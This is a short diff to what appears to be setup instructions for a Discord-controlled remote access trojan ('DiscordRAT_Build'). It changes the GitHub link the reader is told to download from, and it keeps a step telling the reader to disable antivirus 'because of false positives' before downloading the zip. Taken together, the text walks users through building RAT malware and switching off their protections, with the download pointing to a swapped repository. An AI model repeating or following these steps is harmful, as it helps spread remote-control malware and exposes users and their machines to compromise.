@@ -13,7 +13,7 @@
 5. While you are still there, copy the Generated URL and paste it into the same notepad where you pasted your bot token.
  
  
-6. Now that that's out of the way, go to this github page: https://github.com/hassamohammed/DiscordRAT_Build
+6. Now that that's out of the way, go to this github page: https://github.com/DhritimoyDas/DiscordRAT_Build
  
  
 7. Disable antivirus because of false positives and download the zip.
